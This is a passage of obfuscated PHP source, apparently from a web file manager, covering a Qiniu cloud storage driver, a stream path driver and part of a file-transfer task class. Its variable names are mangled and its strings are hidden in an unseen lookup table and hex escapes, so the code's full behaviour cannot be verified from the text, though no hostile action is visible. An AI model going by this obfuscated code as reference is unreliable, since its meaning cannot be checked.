$ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($¦°îÎ¸×) { parent::__construct(); require_once SDK_DIR . $_SERVER[”øäÃÍª][1689]; $this->_init($¦°îÎ¸×); } public function _init($‚Ú’ß¸“) { $°€ê³ìó =& $_SERVER[”øäÃÍª]; $this->config = $‚Ú’ß¸“; foreach ($‚Ú’ß¸“ as $¡‹ò®’ => $„ÃŸÉ) { if (isset($this->{$¡‹ò®’})) { $this->{$¡‹ò®’} = $„ÃŸÉ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($°€ê³ìó[1690] . LNG($°€ê³ìó[1627])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¶ªÉî©», $È¬¼×å = '', $º¬ÁØÀ = REPEAT_RENAME) { if ($this->setContent($¶ªÉî©», $È¬¼×å)) { return $this->getPathOuter($¶ªÉî©»); } return !1; } public function mkdir($»‹ÓÅ³, $ò«å¢ ª = REPEAT_SKIP) { $µ¸Êµ˜´ =& $_SERVER[”øäÃÍª]; $Ïõï¸ã¢ = trim($»‹ÓÅ³, $µ¸Êµ˜´[8]); if ($this->_isFolder($Ïõï¸ã¢)) { return $this->getPathOuter($Ïõï¸ã¢); } $»‹ÓÅ³ = $Ïõï¸ã¢ . $µ¸Êµ˜´[8]; $¬œ¹•ë = get_path_this($Ïõï¸ã¢); $œ‚™¹È… = $»‹ÓÅ³ . $¬œ¹•ë; if (!$this->mkfile($œ‚™¹È…)) { return !1; } if (!$this->moveFile($œ‚™¹È…, $»‹ÓÅ³)) { $this->delFile($œ‚™¹È…); return !1; } return $this->getPathOuter($Ïõï¸ã¢); } public function copyFile($ÄàçÄ–¢, $Ú¦ Áóß) { $ÃƒÓ­óŞ = $this->bucketManager->copy($this->bucket, $ÄàçÄ–¢, $this->bucket, $Ú¦ Áóß, !0); return $ÃƒÓ­óŞ ? !1 : $this->getPathOuter($Ú¦ Áóß); } public function moveFile($£­·ñì, $Ñ´Ñ¦İâ) { $üˆÖš™Ê = $this->bucketManager->move($this->bucket, $£­·ñì, $this->bucket, $Ñ´Ñ¦İâ, !0); return $üˆÖš™Ê ? !1 : $this->getPathOuter($Ñ´Ñ¦İâ); } public function delFile($ÇóİÌ¯) { if (!$this->exist($ÇóİÌ¯)) { return !0; } $¼÷¶ê¿ä = $this->bucketManager->delete($this->bucket, $ÇóİÌ¯); if (!$¼÷¶ê¿ä) { return !0; } return $¼÷¶ê¿ä->code() == 612 ? !0 : !1; } public function delFolder($¾Ş’†ÛŞ) { $šè¨úğ =& $_SERVER[”øäÃÍª]; if (!$this->exist($¾Ş’†ÛŞ)) { return !0; } $this->listItemCache = !1; $œëºá„æ = $this->fileList($¾Ş’†ÛŞ); $this->listItemCache = !0; $¯åÁŸ¡´ = trim($¾Ş’†ÛŞ, $šè¨úğ[8]) . $šè¨úğ[8]; if (!empty($¾Ş’†ÛŞ) && $¾Ş’†ÛŞ !== $šè¨úğ[228] && !in_array($¯åÁŸ¡´, $œëºá„æ[$šè¨úğ[85]])) { $œëºá„æ[$šè¨úğ[85]][] = $¯åÁŸ¡´; } $õÆ•Ëãà = $this->delByBatch($œëºá„æ[$šè¨úğ[86]]); if (!$õÆ•Ëãà) { return !1; } $õÆ•Ëãà = $this->delByBatch($œëºá„æ[$šè¨úğ[85]]); if (!$õÆ•Ëãà) { return !1; } return $this->delFile($¯åÁŸ¡´); } private function delByBatch($¼Ë²äÅ£) { foreach (array_chunk($¼Ë²äÅ£, 1000) as $ß•»¤×Ú) { $¿»ÃÑ© = $this->bucketManager->buildBatchDelete($this->bucket, $ß•»¤×Ú); list($ÇÃø–áğ, $™”î“Œô) = $this->bucketManager->batch($¿»ÃÑ©); if ($™”î“Œô) { return !1; } } return !0; } public function rename($›µÙÉÁ‰, $Ïµ©§¨ä) { return $this->renameObject($›µÙÉÁ‰, $Ïµ©§¨ä); } public function fileInfo($¢ß¯‡, $±Áä† = false, $€Æà§ˆ¢ = array()) { $¦É¶¤îë =& $_SERVER[”øäÃÍª]; $Ç±“´Àù = array($¦É¶¤îë[32] => $this->pathThis($¢ß¯‡), $¦É¶¤îë[87] => $this->getPathOuter($¦É¶¤îë[8] . $¢ß¯‡), $¦É¶¤îë[33] => $¦É¶¤îë[230], $¦É¶¤îë[79] => isset($€Æà§ˆ¢[$¦É¶¤îë[1691]]) ? $€Æà§ˆ¢[$¦É¶¤îë[1691]] : 0, $¦É¶¤îë[166] => $this->ext($¢ß¯‡)); if ($±Áä†) { return $Ç±“´Àù; } $Ç±“´Àù[$¦É¶¤îë[231]] = $Ç±“´Àù[$¦É¶¤îë[88]] = 0; $Ç±“´Àù[$¦É¶¤îë[232]] = $Ç±“´Àù[$¦É¶¤îë[233]] = !0; if (empty($€Æà§ˆ¢)) { $€Æà§ˆ¢ = $this->objectMeta($¢ß¯‡); if (!$€Æà§ˆ¢) { return $Ç±“´Àù; } } if (isset($€Æà§ˆ¢[$¦É¶¤îë[234]]) && $€Æà§ˆ¢[$¦É¶¤îë[234]]) { $Ç±“´Àù[$¦É¶¤îë[235]] = $€Æà§ˆ¢[$¦É¶¤îë[234]]; } if (isset($€Æà§ˆ¢[$¦É¶¤îë[245]]) && $€Æà§ˆ¢[$¦É¶¤îë[245]]) { $Ç±“´Àù[$¦É¶¤îë[235]] = $€Æà§ˆ¢[$¦É¶¤îë[245]]; } if (isset($€Æà§ˆ¢[$¦É¶¤îë[1692]])) { $Ç±“´Àù[$¦É¶¤îë[88]] = substr($€Æà§ˆ¢[$¦É¶¤îë[1692]] . $¦É¶¤îë[12], 0, 10); } if (isset($€Æà§ˆ¢[$¦É¶¤îë[1691]])) { $Ç±“´Àù[$¦É¶¤îë[79]] = $€Æà§ˆ¢[$¦É¶¤îë[1691]]; } return $Ç±“´Àù; } public function folderInfo($­©ö½úˆ, $§Ğş­òÁ = false) { $ÆÊ±á„ =& $_SERVER[”øäÃÍª]; $Õí‰û¢œ = array($ÆÊ±á„[32] => $this->pathThis($­©ö½úˆ), $ÆÊ±á„[87] => $this->getPathOuter($ÆÊ±á„[8] . $­©ö½úˆ), $ÆÊ±á„[33] => $ÆÊ±á„[78]); if ($§Ğş­òÁ) { return $Õí‰û¢œ; } $Õí‰û¢œ[$ÆÊ±á„[231]] = $Õí‰û¢œ[$ÆÊ±á„[88]] = 0; $Õí‰û¢œ[$ÆÊ±á„[232]] = $Õí‰û¢œ[$ÆÊ±á„[233]] = !0; $­©ö½úˆ = rtrim($­©ö½úˆ, $ÆÊ±á„[8]) . $ÆÊ±á„[8]; $§¿›ùèß = $this->objectMeta($­©ö½úˆ); if (isset($§¿›ùèß[$ÆÊ±á„[1692]])) { $Õí‰û¢œ[$ÆÊ±á„[88]] = substr($§¿›ùèß[$ÆÊ±á„[1692]] . $ÆÊ±á„[12], 0, 10); } return $Õí‰û¢œ; } public function listPath($Ã®â¸Œ›, $—ÊôÀí = false) { $©­„Îü =& $_SERVER[”øäÃÍª]; $¿éíÁó˜ = $this->fileList($Ã®â¸Œ›, $©­„Îü[8], !0); foreach ($¿éíÁó˜[$©­„Îü[85]] as $åğ§Ìˆ© => $‡çàãŒ) { $¿éíÁó˜[$©­„Îü[85]][$åğ§Ìˆ©] = $this->folderInfo($‡çàãŒ, $—ÊôÀí); } foreach ($¿éíÁó˜[$©­„Îü[86]] as $åğ§Ìˆ© => $‡çàãŒ) { $¿éíÁó˜[$©­„Îü[86]][$åğ§Ìˆ©] = $this->fileInfo($‡çàãŒ[$©­„Îü[32]], $—ÊôÀí, $‡çàãŒ); } return $¿éíÁó˜; } public function has($ÈÕ·‘Ø¥, $”ü›õÚØ = false, $ĞˆÀè  = true) { $ÃêÕŞš =& $_SERVER[”øäÃÍª]; $ÈÕ·‘Ø¥ = trim($ÈÕ·‘Ø¥, $ÃêÕŞš[8]); $ÆşÁÕû´ = empty($ÈÕ·‘Ø¥) && $ÈÕ·‘Ø¥ !== $ÃêÕŞš[228] ? $ÃêÕŞš[12] : $ÈÕ·‘Ø¥ . $ÃêÕŞš[8]; $”Êàá‡Ã = $ÃêÕŞš[12]; $Â¾ü¦Ü» = 500; $Å†ıüÒõ = $ÃêÕŞš[8]; $ÁÈ¢„öŒ = $¬‚ŸÙŸÀ = 0; while (!0) { check_abort(); list($öâ™‰Î, $˜–Ã­•ƒ) = $this->bucketManager->listFiles($this->bucket, $ÆşÁÕû´, $”Êàá‡Ã, $Â¾ü¦Ü», $Å†ıüÒõ); if ($˜–Ã­•ƒ) { break; } $”Êàá‡Ã = array_key_exists($ÃêÕŞš[1639], $öâ™‰Î) ? $”Êàá‡Ã = $öâ™‰Î[$ÃêÕŞš[1693]] : $ÃêÕŞš[12]; if ($”ü›õÚØ) { if (!empty($öâ™‰Î[$ÃêÕŞš[1694]])) { $ÁÈ¢„öŒ += count($öâ™‰Î[$ÃêÕŞš[1694]]); } if (!empty($öâ™‰Î[$ÃêÕŞš[1695]])) { $¬‚ŸÙŸÀ += count($öâ™‰Î[$ÃêÕŞš[1695]]); } if ($”Êàá‡Ã === $ÃêÕŞš[12]) { break; } continue; } if ($ĞˆÀè ) { if (!empty($öâ™‰Î[$ÃêÕŞš[1694]])) { return !0; } } else { if (!empty($öâ™‰Î[$ÃêÕŞš[1695]])) { return !0; } } if ($”Êàá‡Ã === $ÃêÕŞš[12]) { break; } } if ($”ü›õÚØ) { return array($ÃêÕŞš[239] => $ÁÈ¢„öŒ, $ÃêÕŞš[240] => $¬‚ŸÙŸÀ); } return !1; } public function listAll($Í­ò­×…) { $Ä¦Ó–øå =& $_SERVER[”øäÃÍª]; $—•›‰«© = $this->fileList($Í­ò­×…, $Ä¦Ó–øå[12], !0); $¸ªòæ® = array_to_keyvalue($—•›‰«©[$Ä¦Ó–øå[86]], $Ä¦Ó–øå[32]); foreach ($—•›‰«©[$Ä¦Ó–øå[85]] as $ÃÜÄ® À) { if (is_string($ÃÜÄ® À)) { $¸ªòæ®[$ÃÜÄ® À] = array($Ä¦Ó–øå[79] => 0); } } return $this->listAllFiles($Í­ò­×…, $¸ªòæ®); } private function fileList($›öœÎïë, $Ÿ¸ŞŸú = '', $øá°£±å = 0) { $âìÕ‡ =& $_SERVER[”øäÃÍª]; $›öœÎïë = trim($›öœÎïë, $âìÕ‡[8]); $ÓÒœß…Œ = empty($›öœÎïë) && $›öœÎïë !== $âìÕ‡[228] ? $âìÕ‡[12] : $›öœÎïë . $âìÕ‡[8]; $¸üÆï­¤ = $âìÕ‡[12]; $›³ÜšÁ = 1000; $¡àäüÉ« = $Å×—Á¡¥ = array(); while (!0) { check_abort(); list($îÖ¨˜, $©ï ö) = $this->bucketManager->listFiles($this->bucket, $ÓÒœß…Œ, $¸üÆï­¤, $›³ÜšÁ, $Ÿ¸ŞŸú); if ($©ï ö) { break; } $¸üÆï­¤ = array_key_exists($âìÕ‡[1639], $îÖ¨˜) ? $¸üÆï­¤ = $îÖ¨˜[$âìÕ‡[1693]] : $âìÕ‡[12]; $µÜĞÛäŒ = isset($îÖ¨˜[$âìÕ‡[1694]]) ? $îÖ¨˜[$âìÕ‡[1694]] : array(); $°± ÅÄş = isset($îÖ¨˜[$âìÕ‡[1695]]) ? $îÖ¨˜[$âìÕ‡[1695]] : array(); foreach ($µÜĞÛäŒ as $®õÏÛÍá) { if ($®õÏÛÍá[$âìÕ‡[95]] == $ÓÒœß…Œ) { continue; } $œ†ş„ÙŸ = $®õÏÛÍá[$âìÕ‡[95]]; $ı—ò”Î® = $®õÏÛÍá[$âìÕ‡[1691]]; $®õÏÛÍá[$âìÕ‡[32]] = $œ†ş„ÙŸ; $®õÏÛÍá[$âìÕ‡[79]] = $ı—ò”Î®; $ÚÁİ £ = $ı—ò”Î® == 0 && substr($œ†ş„ÙŸ, strlen($œ†ş„ÙŸ) - 1, 1) == $âìÕ‡[8] ? !0 : !1; $this->cacheMethodInfoSet($œ†ş„ÙŸ, $ÚÁİ £, $®õÏÛÍá); if ($ÚÁİ £) { $¡àäüÉ«[] = $œ†ş„ÙŸ; continue; } $Å×—Á¡¥[] = $øá°£±å ? $®õÏÛÍá : $œ†ş„ÙŸ; } foreach ($°± ÅÄş as $œ†ş„ÙŸ) { if ($œ†ş„ÙŸ == $ÓÒœß…Œ) { continue; } $¡àäüÉ«[] = $œ†ş„ÙŸ; $this->cacheMethodInfoSet($œ†ş„ÙŸ, !0); } if ($¸üÆï­¤ === $âìÕ‡[12]) { break; } } $this->cacheMethodInfoSet($›öœÎïë, !0); return array($âìÕ‡[85] => $¡àäüÉ«, $âìÕ‡[86] => $Å×—Á¡¥); } public function canRead($ÃÉ›ÊâÏ) { return $this->exist($ÃÉ›ÊâÏ) ? !0 : !1; } public function canWrite($Ÿ¸Ó¼‰) { return $this->exist($Ÿ¸Ó¼‰) ? !0 : !1; } public function getContent($Ì«ôáÈ) { return $this->fileSubstr($Ì«ôáÈ, 0, -1); } public function setContent($×æ¯‰éº, $ºœÌ¼“£ = '') { $“‚„¼‰Ñ = $this->tempFile($this->pathThis($×æ¯‰éº)); file_put_contents($“‚„¼‰Ñ, $ºœÌ¼“£); if ($this->upload($×æ¯‰éº, $“‚„¼‰Ñ)) { $this->tempFileRemve($“‚„¼‰Ñ); return !0; } return !1; } public function refreshUrls($€ï­ÂÔ«) { $Ù¿ªè©ª =& $_SERVER[”øäÃÍª]; $«ò‘°õü = array(); if (is_array($€ï­ÂÔ«)) { foreach ($€ï­ÂÔ« as $ Ù²•¹ß) { $«ò‘°õü[] = $this->link($ Ù²•¹ß); } } else { $«ò‘°õü[] = $this->link($€ï­ÂÔ«); } $®Îî³…± = new Qiniu\Cdn\CdnManager($this->auth); list($Ç’Ë’Ö, $œÀìØÉ³) = $®Îî³…±->refreshUrls($«ò‘°õü); if ($œÀìØÉ³) { return !1; } return $Ç’Ë’Ö[$Ù¿ªè©ª[1323]] == $Ù¿ªè©ª[869] ? !0 : !1; } public function fileSubstr($†æ–„šÒ, $ƒ¥¡ñ€İ, $®Œª²’Ã) { $ËÀ‰ûï =& $_SERVER[”øäÃÍª]; if (!($èî °ë = $this->link($†æ–„šÒ))) { return !1; } $Õ­îà¼Á = !1; if ($®Œª²’Ã > 0) { $¼İ¿íµ = $ƒ¥¡ñ€İ + $®Œª²’Ã - 1; $Õ­îà¼Á = array($ËÀ‰ûï[1560] . $ƒ¥¡ñ€İ . $ËÀ‰ûï[476] . $¼İ¿íµ); } $…‹ì‡·• = url_request($èî °ë, $ËÀ‰ûï[1561], !1, $Õ­îà¼Á); return $…‹ì‡·•[$ËÀ‰ûï[859]] ? $…‹ì‡·•[$ËÀ‰ûï[1345]] : !1; } public function upload($ÇıäÂ£ö, $æ‡úÜé, $Ñ£‘›Ïİ = false, $ÈÚºó—ç = REPEAT_REPLACE) { if (!$æ‡úÜé || !@file_exists($æ‡úÜé)) { return !1; } $±áŞİÆ = new Qiniu\Storage\UploadManager(); $·Å±Ê½ñ = $this->auth->uploadToken($this->bucket, $ÇıäÂ£ö); $ôÆÖîĞ÷ = get_file_mime(get_path_ext($æ‡úÜé)); list($“Ü‚ŸÀ, $ïæ²†ƒ€) = $±áŞİÆ->putFile($·Å±Ê½ñ, $ÇıäÂ£ö, $æ‡úÜé, null, $ôÆÖîĞ÷); return $ïæ²†ƒ€ ? !1 : $this->getPathOuter($ÇıäÂ£ö); } public function uploadFormData($Á¡¦ß¡°, $çÉ¹¯ˆ¬ = 3600) { return $this->uploadToken($Á¡¦ß¡°, $çÉ¹¯ˆ¬); } public function uploadMultiData($ñ¨Í·©å, $ÛêåØæ½ = 3600) { return $this->uploadToken($ñ¨Í·©å, $ÛêåØæ½); } private function uploadToken($ÎäÒëê , $Îú­Ÿ‰’ = 3600) { $ï¸›ã§ =& $_SERVER[”øäÃÍª]; $ØùÔµé« = $Îú­Ÿ‰’; $‹ï›Ô„Ê = array($ï¸›ã§[1696] => $ï¸›ã§[1697]); $ŠƒÒÎ¹ = $ÎäÒëê ; $ğ®‰à”œ = $this->auth->uploadToken($this->bucket, $ŠƒÒÎ¹, $ØùÔµé«, $‹ï›Ô„Ê, !0); $‡Ñ ×æ€ = empty($this->region) || $this->region == $ï¸›ã§[1698] ? $ï¸›ã§[12] : $ï¸›ã§[476] . $this->region; $¸ŞóÀÓá = http_type() . "\72\x2f\x2f\x75\160\154\x6f\141\144{$‡Ñ ×æ€}\x2e\x71\151\x6e\x69\165\160\x2e\x63\x6f\x6d\x2f"; return array($ï¸›ã§[1699] => $ğ®‰à”œ, $ï¸›ã§[1563] => $¸ŞóÀÓá); } public function download($œÔœØ–, $á“÷†¢À) { $áÌßÆ’× = IO::getPathInner(IO::mkfile($á“÷†¢À)); if (!($ö»Çõğ± = $this->link($œÔœØ–))) { return !1; } $ˆï¤‹™ = 0; $æ±ü¦ß´ = 1024 * 200; $¿şŠı† = fopen($áÌßÆ’×, $_SERVER[”øäÃÍª][1700]); while (!0) { $¤Ñ¯ŒŞÙ = $this->fileSubstr($œÔœØ–, $ˆï¤‹™, $æ±ü¦ß´); if ($¤Ñ¯ŒŞÙ === !1) { return !1; } fwrite($¿şŠı†, $¤Ñ¯ŒŞÙ); $ˆï¤‹™ += $æ±ü¦ß´; if (strlen($¤Ñ¯ŒŞÙ) < $æ±ü¦ß´) { break; } } fclose($¿şŠı†); return $á“÷†¢À; } public function link($Ü¥åøÏñ, $öƒ´˜™ù = '') { if (!$this->isFile($Ü¥åøÏñ)) { return !1; } $ğµã–âè = $this->getHost() . $_SERVER[”øäÃÍª][8] . $this->pathEncode($Ü¥åøÏñ) . $öƒ´˜™ù; return $this->auth->privateDownloadUrl($ğµã–âè, 3600 * 12); } public function fileOut($²»ã“ØÃ, $²æã°„š = false, $†Áªªá¥ = false, $°ŞµÓ‚ä = '') { $Š’æü×à =& $_SERVER[”øäÃÍª]; if ($this->isFileOutServer()) { return $this->fileOutServer($²»ã“ØÃ, $²æã°„š, $†Áªªá¥, $°ŞµÓ‚ä); } if (!$†Áªªá¥) { $†Áªªá¥ = $this->pathThis($²»ã“ØÃ); } $Ïõó—ä¹ = $²æã°„š ? $Š’æü×à[1701] . rawurlencode($†Áªªá¥) : $Š’æü×à[12]; $Ü½öæ®Ì = $this->link($²»ã“ØÃ, $Ïõó—ä¹); $this->fileOutLink($Ü½öæ®Ì); } public function fileOutServer($ê²º™ò, $µÙÁïÙÌ = false, $î…ºü¯ = false, $Ü†¡×¨— = '') { parent::fileOut($ê²º™ò, $µÙÁïÙÌ, $î…ºü¯, $Ü†¡×¨—); } public function fileOutImage($ëüöÇÅ¯, $Ñ‡ü©Ÿá = 250) { if ($this->size($ëüöÇÅ¯) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ëüöÇÅ¯, $Ñ‡ü©Ÿá); } $ƒ¶¿ÜÈ = $this->link($ëüöÇÅ¯, $_SERVER[”øäÃÍª][1702] . $Ñ‡ü©Ÿá); $this->fileOutLink($ƒ¶¿ÜÈ); } public function fileOutImageServer($¦ø¿ÏÒ, $ÌŸñÌÔ© = 250) { parent::fileOutImage($¦ø¿ÏÒ, $ÌŸñÌÔ©); } public function hashMd5($ûÇ³÷Áâ) { $ß¸Ì¤²Î =& $_SERVER[”øäÃÍª]; $……›¤å¨ = $this->objectMeta($ûÇ³÷Áâ); return isset($……›¤å¨[$ß¸Ì¤²Î[245]]) ? $……›¤å¨[$ß¸Ì¤²Î[245]] : !1; $Ïƒ²¥² = $this->link($ûÇ³÷Áâ, $ß¸Ì¤²Î[1703]); } public function size($‹œçÌëù) { $Ë¼ ĞÑ“ = $this->objectMeta($‹œçÌëù); return $Ë¼ ĞÑ“ ? $Ë¼ ĞÑ“[$_SERVER[”øäÃÍª][79]] : 0; } public function info($œ–ù¤åí) { if ($this->isFolder($œ–ù¤åí)) { return $this->folderInfo($œ–ù¤åí); } else { if ($this->isFile($œ–ù¤åí)) { return $this->fileInfo($œ–ù¤åí); } } return !1; } public function exist($éÀÄáä) { return $this->isFile($éÀÄáä) || $this->isFolder($éÀÄáä); } public function isFile($ã™¦ûá¸) { return !$this->isFolder($ã™¦ûá¸) && $this->objectMeta($ã™¦ûá¸); } public function isFolder($ëÛÅĞì) { return $this->cacheMethod($_SERVER[”øäÃÍª][177], $ëÛÅĞì); } protected function objectMeta($ƒ½¡½å) { return $this->cacheMethod($_SERVER[”øäÃÍª][179], $ƒ½¡½å); } protected function _objectMeta($ÉÂ‘ØÎĞ) { $‰—Œ·ÓÎ =& $_SERVER[”øäÃÍª]; list($·€Ù¶Û¶, $ê„ÁåÔ) = $this->bucketManager->stat($this->bucket, $ÉÂ‘ØÎĞ); if ($·€Ù¶Û¶) { $·€Ù¶Û¶[$‰—Œ·ÓÎ[79]] = intval($·€Ù¶Û¶[$‰—Œ·ÓÎ[1691]]); } return $·€Ù¶Û¶; } protected function _isFolder($Øú¥…æ) { $¹ÆÑé°¹ =& $_SERVER[”øäÃÍª]; if ($Øú¥…æ == $¹ÆÑé°¹[12] || $Øú¥…æ == $¹ÆÑé°¹[8]) { return !0; } list($¿Æ¼Ÿö, $œ““™¸) = $this->bucketManager->listFiles($this->bucket, trim($Øú¥…æ, $¹ÆÑé°¹[8]) . $¹ÆÑé°¹[8], $¹ÆÑé°¹[12], 1, $¹ÆÑé°¹[8]); return !empty($¿Æ¼Ÿö[$¹ÆÑé°¹[1694]]) || !empty($¿Æ¼Ÿö[$¹ÆÑé°¹[1695]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($àíàĞá, $°¾ğùõ˜ = 0) { parent::__construct(); $this->source = $àíàĞá; $this->sourceSize = $°¾ğùõ˜; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($—Ï•ÖÌ® = false) { return $this->sourceSize; } public function getContent($Ÿ›ñÛ¤Ø = false) { return $this->fileSubstr($Ÿ›ñÛ¤Ø, 0, $this->sourceSize); } public function fileSubstr($ò®Şõ£ = false, $º¤ÚÕê = 0, $à×Êá«É = 0) { if (!$à×Êá«É) { $à×Êá«É = $this->sourceSize; } $„òĞ‘Á = $this->sourceSize - $º¤ÚÕê; if ($à×Êá«É >= $„òĞ‘Á) { $à×Êá«É = $„òĞ‘Á; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $º¤ÚÕê, $à×Êá«É); } if ($this->sourceType == self::TYPE_FILE) { if ($à×Êá«É <= 0) { return $_SERVER[”øäÃÍª][12]; } $á®½ÖÎÉ = ftell($this->source); fseek_64($this->source, $á®½ÖÎÉ + $º¤ÚÕê); $·Æôò­‚ = @fread($this->source, $à×Êá«É); fseek_64($this->source, $á®½ÖÎÉ); return $·Æôò­‚; } } public function hashMd5($£òóÔ¢Ì = false) { return md5($this->getContent()); } public static function hash($û‡è è, $ƒ©²«ı® = 0) { $Ø§“¦±é = new PathDriverStream($û‡è è, $ƒ©²«ı®); return $Ø§“¦±é->hashSimple($û‡è è); } public static function md5($·—«Ş–•, $†§êË«Î = 0) { $«±öŠ˜ = new PathDriverStream($·—«Ş–•, $†§êË«Î); return $«±öŠ˜->hashMd5($·—«Ş–•); } } goto fƒ‘ÇÕÓº; EÉ ÏŸÌÀ: class TaskFileTransfer extends Task { protected function startAfter() { $“Şóö· =& $_SERVER[”øäÃÍª]; $»üîÖè” =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($“Şóö·[1964], array($this, $“Şóö·[1965])); Hook::bind($“Şóö·[1366], array($this, $“Şóö·[1966])); Hook::bind($“Şóö·[1967], array($this, $“Şóö·[1968])); Hook::bind($“Şóö·[698], array($this, $“Şóö·[1969])); Hook::bind($“Şóö·[699], array($this, $“Şóö·[1970])); Hook::bind($“Şóö·[705], array($this, $“Şóö·[1971])); Hook::bind($“Şóö·[706], array($this, $“Şóö·[1972])); Hook::bind($“Şóö·[701], array($this, $“Şóö·[1973])); Hook::bind($“Şóö·[703], array($this, $“Şóö·[1974])); Hook::bind($“Şóö·[667], array($this, $“Şóö·[1975])); Hook::bind($“Şóö·[664], array($this, $“Şóö·[1975])); Hook::bind($“Şóö·[669], array($this, $“Şóö·[1975])); Hook::bind($“Şóö·[671], array($this, $“Şóö·[1975])); Hook::bind($“Şóö·[673], array($this, $“Şóö·[1975])); Hook::bind($“Şóö·[1976], array($this, $“Şóö·[1977])); Hook::bind($“Şóö·[689], array($this, $“Şóö·[1978])); $this->sourceModelCopyFlag = !1; Hook::bind($“Şóö·[1979], array($this, $“Şóö·[1980])); Hook::bind($“Şóö·[1981], array($this, $“Şóö·[1982])); Hook::bind($“Şóö·[1983], array($this, $“Şóö·[1984])); $»üîÖè”[$“Şóö·[1985]] = LNG($“Şóö·[1986]); $»üîÖè”[$“Şóö·[1987]] = 0; $»üîÖè”[$“Şóö·[1988]] = 0; $»üîÖè”[$“Şóö·[1186]] = $“Şóö·[12]; $»üîÖè”[$“Şóö·[1989]] = $“Şóö·[12]; $»üîÖè”[$“Şóö·[1990]] = 0; $»üîÖè”[$“Şóö·[1991]] = 0; $»üîÖè”[$“Şóö·[1992]] = 0; if (!$»üîÖè”[$“Şóö·[1819]]) { $»üîÖè”[$“Şóö·[1819]] = LNG($“Şóö·[1993]); } } protected function endAfter() { $ÙÊ÷ªßã =& $_SERVER[”øäÃÍª]; Hook::unbind($ÙÊ÷ªßã[1964], array($this, $ÙÊ÷ªßã[1965])); Hook::unbind($ÙÊ÷ªßã[1366], array($this, $ÙÊ÷ªßã[1966])); Hook::unbind($ÙÊ÷ªßã[1967], array($this, $ÙÊ÷ªßã[1968])); Hook::unbind($ÙÊ÷ªßã[698], array($this, $ÙÊ÷ªßã[1969])); Hook::unbind($ÙÊ÷ªßã[699], array($this, $ÙÊ÷ªßã[1970])); Hook::unbind($ÙÊ÷ªßã[705], array($this, $ÙÊ÷ªßã[1971])); Hook::unbind($ÙÊ÷ªßã[706], array($this, $ÙÊ÷ªßã[1972])); Hook::unbind($ÙÊ÷ªßã[701], array($this, $ÙÊ÷ªßã[1973])); Hook::unbind($ÙÊ÷ªßã[703], array($this, $ÙÊ÷ªßã[1974])); Hook::unbind($ÙÊ÷ªßã[667], array($this, $ÙÊ÷ªßã[1975])); Hook::unbind($ÙÊ÷ªßã[664], array($this, $ÙÊ÷ªßã[1975])); Hook::unbind($ÙÊ÷ªßã[669], array($this, $ÙÊ÷ªßã[1975])); Hook::unbind($ÙÊ÷ªßã[671], array($this, $ÙÊ÷ªßã[1975])); Hook::unbind($ÙÊ÷ªßã[673], array($this, $ÙÊ÷ªßã[1975])); Hook::unbind($ÙÊ÷ªßã[1976], array($this, $ÙÊ÷ªßã[1977])); Hook::unbind($ÙÊ÷ªßã[689], array($this, $ÙÊ÷ªßã[1978])); Hook::unbind($ÙÊ÷ªßã[1979], array($this, $ÙÊ÷ªßã[1980])); Hook::unbind($ÙÊ÷ªßã[1981], array($this, $ÙÊ÷ªßã[1982])); Hook::unbind($ÙÊ÷ªßã[1983], array($this, $ÙÊ÷ªßã[1984])); } public function copyMoveStart($Â°öø¢ƒ, $Ö–•€–Û, $¡Ã”Êı«, $éîÍ»¤›) { $œåª†Ú =& $_SERVER[”øäÃÍª]; self::log($œåª†Ú[1994] . $Ö–•€–Û . $œåª†Ú[73] . $éîÍ»¤›); $©ºÚìƒ‘ = rtrim(TEMP_FILES, $œåª†Ú[8]); if (substr($Ö–•€–Û, 0, strlen($©ºÚìƒ‘)) == $©ºÚìƒ‘) { return; } if (substr($éîÍ»¤›, 0, strlen($©ºÚìƒ‘)) == $©ºÚìƒ‘) { return; } $Í°µí =& $this->task; $Í°µí[$œåª†Ú[1995]] = KodIO::transferType($Â°öø¢ƒ, $¡Ã”Êı«); self::log($œåª†Ú[1996] . $Í°µí[$œåª†Ú[1995]] . $œåª†Ú[74] . $Ö–•€–Û . $œåª†Ú[73] . $éîÍ»¤›); $this->update(); } public function updateAfter() { $¶öªªï =& $_SERVER[”øäÃÍª]; $Ì£õİ÷´ =& $this->task; if (!$Ì£õİ÷´[$¶öªªï[873]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Ì£õİ÷´[$¶öªªï[1995]] == $¶öªªï[1469]) { return; } self::updateTask($Ì£õİ÷´); } private static function updateTask(&$†ÛÄİÚô) { $õ«ä„²© =& $_SERVER[”øäÃÍª]; if ($†ÛÄİÚô[$õ«ä„²©[1995]] == $õ«ä„²©[1337] || $†ÛÄİÚô[$õ«ä„²©[1995]] == $õ«ä„²©[107]) { if ($†ÛÄİÚô[$õ«ä„²©[1989]]) { $†ÛÄİÚô[$õ«ä„²©[1992]] = $†ÛÄİÚô[$õ«ä„²©[1991]] + $†ÛÄİÚô[$õ«ä„²©[1988]]; } } else { if ($†ÛÄİÚô[$õ«ä„²©[1995]] == $õ«ä„²©[1470]) { if ($†ÛÄİÚô[$õ«ä„²©[1989]] == $õ«ä„²©[1337]) { $†ÛÄİÚô[$õ«ä„²©[1992]] = $†ÛÄİÚô[$õ«ä„²©[1991]] + $†ÛÄİÚô[$õ«ä„²©[1988]] * 0.5; } else { if ($†ÛÄİÚô[$õ«ä„²©[1989]] == $õ«ä„²©[107]) { $†ÛÄİÚô[$õ«ä„²©[1992]] = $†ÛÄİÚô[$õ«ä„²©[1991]] + $†ÛÄİÚô[$õ«ä„²©[1987]] * 0.5 + $†ÛÄİÚô[$õ«ä„²©[1988]] * 0.5; } } } } 